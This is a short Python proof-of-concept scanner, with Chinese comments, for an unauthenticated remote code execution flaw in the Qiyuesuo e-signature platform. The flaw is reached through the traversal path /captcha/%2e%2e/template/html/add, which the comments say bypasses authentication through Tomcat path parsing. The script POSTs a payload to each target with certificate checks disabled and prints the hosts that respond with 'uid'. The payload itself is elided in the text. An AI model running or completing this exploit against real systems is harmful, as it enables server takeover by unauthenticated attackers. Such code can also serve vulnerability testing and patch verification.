#契约锁电子签章平台 /captcha/%2e%2e/template/html/add 接口处存在远程代码执行漏洞，
#未经身份验证的攻击者可通过tomcat对路径参数解析不正当的特性绕过权限认证在目标执行恶意代码，
#获取服务器权限。经过分析和研判，该漏洞利用难度低，可导致远程代码执行，建议尽快修复。
...
def main():
    parse = argparse.ArgumentParser(description="/captcha/%2e%2e/template/html/add 接口处存在远程代码执行漏洞")
...
def poc(target):
    ...
    try:
        ...
        res1 = requests.post(url=target+payload,timeout=5,verify=False,proxies=proxies,headers=headers,json=data)
        if 'uid' in res1.text:
            print(target)
